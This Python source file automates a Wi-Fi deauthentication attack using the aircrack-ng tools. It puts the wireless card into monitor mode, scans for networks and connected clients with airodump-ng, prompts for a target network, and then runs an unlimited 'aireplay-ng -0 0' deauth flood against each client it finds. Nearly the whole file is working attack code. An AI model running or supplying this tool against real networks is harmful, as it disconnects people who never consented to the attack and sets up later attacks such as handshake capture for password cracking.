import subprocess
import time
import os
import csv
from Classes.airodumpNet import airodumpNet
from Classes.airodumpNet import airodumpStation

class aircrack:

    @staticmethod

    def check_wlan_mode():
        cmd = os.listdir('/proc/net/dev_snmp6')
        lo = 'lo'
        eth0 = 'eth0'
        if lo in cmd:
            cmd.remove('lo')
        if eth0 in cmd:
            cmd.remove('eth0')
        result = subprocess.Popen("sudo iwconfig %s" % cmd[0],shell=True,stdout=subprocess.PIPE)
        out, err = result.communicate()
        interface_mode_index = str(out)
        mode_index = interface_mode_index.find('Mode:')
        interface_mode = interface_mode_index[(mode_index + 5): (mode_index + 8)]
        return interface_mode

    def monitor_mode():
        cmd = 'sudo airmon-ng start wlan0'
        subprocess.call(cmd, shell=True)

    def managed_mode():
        cmd = 'sudo airmon-ng stop wlan0mon'
        subprocess.call(cmd, shell=True)

    def airodump_call():
        cmd = 'sudo airodump-ng --write a/txt01 wlan0mon'
        result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        time.sleep(20)
        result.kill()

    def sort_by_power(arr):
       return arr[8]

    def sort_by_data(arr):
        return arr[10]

    def open_csv_file():
        filename = 'a/txt01-01.csv'
        with open(filename, 'r', newline = '') as file:
            file_reader = csv.reader(file)
            format_file = [row for row in file_reader]
            format_file.pop(1)
            return format_file

    def search_network():
        format_file = aircrack.open_csv_file()
        network_mas = []
        for a in format_file:
            if len(a) == 0:
                continue
            if a[0] == 'Station MAC':
                break
            network_mas.append(a)
        network_mas.sort(key = aircrack.sort_by_data,reverse = True)

        result_array = []

        for current_net in network_mas:
            result = airodumpNet(current_net[0],
                            current_net[3],
                            current_net[5],
                            current_net[8],
                            current_net[9],
                            current_net[10],
                            current_net[13])
            result_array.append(result)

        print(result_array)
        return result_array

    def search_station():
        format_file = aircrack.open_csv_file()
        network_station_mas = []
        staton_index = 0
        csv_file_lenght = len(format_file) - 1
        for a in format_file:
            if len(a) == 0:
                continue
            if a[0] == 'Station MAC':
                staton_index = format_file.index(a) + 1
                break

        for i in range(staton_index,csv_file_lenght):
            station = format_file[i]
            a = airodumpStation(station[0],
                                station[3],
                                station[4],
                                station[5][1:])
            network_station_mas.append(a)
        print(network_station_mas)
        return network_station_mas

    def choose_network():
        net = aircrack.search_network()
        print(net)
        index = 0
        for network in net:
            print("%s: %s" % (index, network.EESID))
            index = index + 1
        select_network = int(input("Select network"))
        return net[select_network]

    def filter_station(network: airodumpNet, station_array: [airodumpStation]):
        result_array = []
        for station in station_array:
            print("a",station.BSSID)
            print("a",network.BSSID)
            if station.BSSID == network.BSSID:
                result_array.append(station)
        print("RESULT", result_array)
        return result_array

    def aireplay_attack():
        ap = aireplay()
        select_network = aircrack.choose_network()
        station_array = aircrack.search_station()
        select_station_array = aircrack.filter_station(select_network, station_array)
        if len(select_station_array) > 0:
            for station in select_station_array:
                ap.deauth_attack(select_network, station)
        else:
            print("0 station in network")

class aireplay:

    def deauth_attack(self, net: airodumpNet, station: airodumpStation):
        cmd = ('sudo aireplay-ng -0 0 -a %s -c %s wlan0mon' %  (net.BSSID, station.MAC))
        print(cmd)
        self.change_channel(net)
        result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        #out, err = result.communicate()
        #print(out)
        time.sleep(15)
        result.kill()

    def change_channel(self, net: airodumpNet):
        cmd = ('sudo iwconfig wlan0mon channel %s' % net.channel)
        subprocess.call(cmd, shell=True)







